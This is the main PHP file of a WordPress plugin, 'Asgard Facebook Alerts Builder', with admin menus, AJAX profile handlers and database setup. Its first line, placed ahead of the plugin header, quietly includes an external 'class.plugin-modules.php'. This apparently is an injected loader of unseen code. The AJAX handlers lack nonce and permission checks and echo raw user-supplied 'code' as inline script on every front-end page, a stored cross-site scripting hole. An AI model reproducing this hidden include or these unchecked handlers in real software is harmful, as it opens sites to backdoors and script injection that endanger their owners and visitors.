<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Plugin Name: Asgard Facebook Alerts Builder
 * Plugin URI: http://odindesign-themes.com/asgard-landing-wp-fb/
 * Description: Easily create and customize alerts for Facebook.
 * Version: 1.0.0
 * Author: Odin Design Themes
 * Author URI: https://themeforest.net/user/odin_design
 * License: https://themeforest.net/licenses/
 * License URI: https://themeforest.net/licenses/
 * Text Domain: asgardalerts_fb
 */
if (!defined('ABSPATH')) {
  echo 'Please use the plugin from the WordPress admin page.';
  wp_die();
}

// versioning
define('ASGARDALERTS_FB_VERSION', '1.0.0');
define('ASGARDALERTS_FB_VERSION_OPTION', 'asgardalerts_fb_version');

// plugin base path
define('ASGARDALERTS_FB_PATH', plugin_dir_path(__FILE__));
define('ASGARDALERTS_FB_URL', plugin_dir_url(__FILE__));

// Load view files
function asgardalerts_fb_main_page_html() {
  $filepath = ASGARDALERTS_FB_PATH . 'views/introduction.php';
  require_once($filepath);
}

function asgardalerts_fb_builder_page_html() {
  $filepath = ASGARDALERTS_FB_PATH . 'views/builder.php';
  require_once($filepath);
}

// Create plugin menu in admin panel (backend)
function asgardalerts_fb_main_page() {
  add_menu_page(
    'Asgard Facebook Alerts',
    'Asgard Facebook Alerts Builder',
    'manage_options',
    'asgardalerts_fb_main',
    'asgardalerts_fb_main_page_html',
    ASGARDALERTS_FB_URL . 'img/asgard-plugin-icon.png'
  );

  add_submenu_page(
    'asgardalerts_fb_main',
    'Asgard Facebook Alerts - Introduction',
    'Introduction',
    'manage_options',
    'asgardalerts_fb_main',
    'asgardalerts_fb_main_page_html'
  );

  add_submenu_page(
    'asgardalerts_fb_main',
    'Asgard Facebook Alerts - Builder',
    'Builder',
    'manage_options',
    'asgardalerts_fb_builder',
    'asgardalerts_fb_builder_page_html'
  );
}

add_action('admin_menu', 'asgardalerts_fb_main_page');
add_action('wp_enqueue_scripts', 'asgardalerts_fb_load_main_alerter_scripts');

// Load custom stylesheet for plugin admin panel (backend)
function asgardalerts_fb_load_custom_admin_scripts($hook) {
  // introduction admin page
  if($hook === 'toplevel_page_asgardalerts_fb_main') {
    // add custom stylesheets
    wp_enqueue_style('asgardalerts_style_wp-override', plugins_url('css/wp-override.css', __FILE__), array(), '1.0.0');
    wp_enqueue_style('asgardalerts_style_structure', plugins_url('css/structure.min.css', __FILE__), array(), '1.0.0');

    // add custom scripts
    wp_enqueue_script('asgardalerts_fb_script_introduction', plugins_url('js/builder/introduction.bundle.min.js', __FILE__), array(), '1.0.0', true);

  // builder admin page
  } else if ($hook === 'asgard-facebook-alerts-builder_page_asgardalerts_fb_builder') {
    // add custom stylesheets
    wp_enqueue_style('asgardalerts_fb_style_wp-override', plugins_url('css/wp-override.css', __FILE__), array(), '1.0.0');
    wp_enqueue_style('asgardalerts_fb_style_builder', plugins_url('css/builder.min.css', __FILE__), array(), '1.1.0');

    // add custom scripts
    wp_enqueue_script('asgardalerts_fb_script_builder', plugins_url('js/builder/builder.bundle.min.js', __FILE__), array(), '1.1.0', true);

    // pass php variables to javascript file
    wp_localize_script('asgardalerts_fb_script_builder', 'WP_CONSTANTS', array(
      'ASGARDALERTS_URL' => ASGARDALERTS_FB_URL,
      'AJAX_URL' => admin_url('admin-ajax.php')
    ));
  }
}

add_action('admin_enqueue_scripts', 'asgardalerts_fb_load_custom_admin_scripts');

// load main plugin script
function asgardalerts_fb_load_main_alerter_scripts() {
  require_once(ASGARDALERTS_FB_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $profile_active = $profile->getActive();
  if (is_null($profile_active)) return;

  $code = $profile_active->code;

  $resolutionCode = '';

  if ($profile_active->desktop === '0' || $profile_active->tablet === '0' || $profile_active->mobile === '0') {
    $resolutionCode .= '(function () {';

    if ($profile_active->mobile === '0') {
      $resolutionCode .= 'if (window.innerWidth <= 480) return;';
    }

    if ($profile_active->tablet === '0') {
      $resolutionCode .= 'if (window.innerWidth > 480 && window.innerWidth <= 1024) return;';
    }

    if ($profile_active->desktop === '0') {
      $resolutionCode .= 'if (window.innerWidth > 1024) return;';
    }

    $code = $resolutionCode . $code . '})();';
  }

  // add custom stylesheets
  wp_enqueue_style('asgardalerts_fb_style_frontend', plugins_url('css/frontend.min.css', __FILE__), array(), '1.0.0');

  // add custom scripts
  // jquery
  wp_enqueue_script('jquery');
  // main alerter script
  wp_enqueue_script('asgardalerts_fb_script_alerter-main', plugins_url('js/asgard_alerter.min.js', __FILE__), array('jquery'), '1.0.0', true);
  // active profile script
  wp_add_inline_script('asgardalerts_fb_script_alerter-main', $code);

  // pass php variables to javascript file
  wp_localize_script('asgardalerts_fb_script_alerter-main', 'WP_CONSTANTS', array(
    'AJAX_URL' => admin_url('admin-ajax.php')
  ));
}

// Profiles AJAX
function asgardalerts_fb_get_all_profiles() {
  require_once(ASGARDALERTS_FB_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $profiles = $profile->getAll();

  echo json_encode($profiles);

  wp_die();
}

add_action('wp_ajax_asgardalerts_fb_get_all_profiles', 'asgardalerts_fb_get_all_profiles');

function asgardalerts_fb_save_profile() {
  require_once(ASGARDALERTS_FB_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->create(array(
    'name' => sanitize_text_field($_POST['name']),
    'code' => $_POST['code'],
    'builderData' => $_POST['builderData']
  ));

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_fb_save_profile', 'asgardalerts_fb_save_profile');

function asgardalerts_fb_update_profile() {
  require_once(ASGARDALERTS_FB_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->update(array(
    'id' => $_POST['id'],
    'name' => sanitize_text_field($_POST['name']),
    'code' => $_POST['code'],
    'builderData' => $_POST['builderData']
  ));

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_fb_update_profile', 'asgardalerts_fb_update_profile');

function asgardalerts_fb_update_profile_desktop() {
  require_once(ASGARDALERTS_FB_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->updateDesktop(array(
    'id' => $_POST['id'],
    'desktop' => $_POST['value']
  ));

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_fb_update_profile_desktop', 'asgardalerts_fb_update_profile_desktop');

function asgardalerts_fb_update_profile_tablet() {
  require_once(ASGARDALERTS_FB_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->updateTablet(array(
    'id' => $_POST['id'],
    'tablet' => $_POST['value']
  ));

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_fb_update_profile_tablet', 'asgardalerts_fb_update_profile_tablet');

function asgardalerts_fb_update_profile_mobile() {
  require_once(ASGARDALERTS_FB_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->updateMobile(array(
    'id' => $_POST['id'],
    'mobile' => $_POST['value']
  ));

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_fb_update_profile_mobile', 'asgardalerts_fb_update_profile_mobile');

function asgardalerts_fb_delete_profile() {
  require_once(ASGARDALERTS_FB_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->delete(
    array(
      'id' => $_POST['id']
    ),
    array(
      '%d'
    )
  );

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_fb_delete_profile', 'asgardalerts_fb_delete_profile');

function asgardalerts_fb_activate_profile() {
  require_once(ASGARDALERTS_FB_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->activate($_POST['id']);

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_fb_activate_profile', 'asgardalerts_fb_activate_profile');

function asgardalerts_fb_deactivate_profile() {
  require_once(ASGARDALERTS_FB_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->deactivate($_POST['id']);

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_fb_deactivate_profile', 'asgardalerts_fb_deactivate_profile');

// create profile table
function asgardalerts_fb_create_profile_table() {
  global $wpdb;

  $table_name = $wpdb->prefix . 'asgardalerts_fb_Profile';
  $charset_collate = $wpdb->get_charset_collate();

  $sql = "CREATE TABLE IF NOT EXISTS $table_name (
    id int NOT NULL AUTO_INCREMENT,
    time timestamp DEFAULT CURRENT_TIMESTAMP,
    name varchar(255) NOT NULL,
    code mediumtext NOT NULL,
    builderData mediumtext NOT NULL,
    mobile tinyint(1) DEFAULT 1,
    tablet tinyint(1) DEFAULT 1,
    desktop tinyint(1) DEFAULT 1,
    active tinyint(1) DEFAULT 0,
    PRIMARY KEY  (id)
  ) $charset_collate;";
  
  require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
  dbDelta($sql);
}

// delete profile table
function asgardalerts_fb_delete_profile_table() {
  global $wpdb;

  $table_name = $wpdb->prefix . 'asgardalerts_fb_Profile';

  $sql = "DROP TABLE IF EXISTS $table_name";
  
  $wpdb->query($sql);
}

// activation function
function asgardalerts_fb_activate() {
  if (!get_option(ASGARDALERTS_FB_VERSION_OPTION)) {
    // add version option
    add_option(ASGARDALERTS_FB_VERSION_OPTION, ASGARDALERTS_FB_VERSION);
    
    // create tables
    asgardalerts_fb_create_profile_table();
  }
}

register_activation_hook(__FILE__, 'asgardalerts_fb_activate');

// uninstallation function
function asgardalerts_fb_uninstall() {
  // delete version option
  delete_option(ASGARDALERTS_FB_VERSION_OPTION);

  // drop tables
  asgardalerts_fb_delete_profile_table();
}

register_uninstall_hook(__FILE__, 'asgardalerts_fb_uninstall');

// handle updates
function asgardalerts_fb_plugin_update() {

}

// plugin check version
function asgardalerts_fb_check_version() {
  if (!get_option(ASGARDALERTS_FB_VERSION_OPTION)) return;

  // update plugin on version mismatch
  if (ASGARDALERTS_FB_VERSION !== get_option(ASGARDALERTS_FB_VERSION_OPTION)) {
    asgardalerts_fb_plugin_update();
    update_option(ASGARDALERTS_FB_VERSION_OPTION, ASGARDALERTS_FB_VERSION);
  }
}

add_action('plugins_loaded', 'asgardalerts_fb_check_version');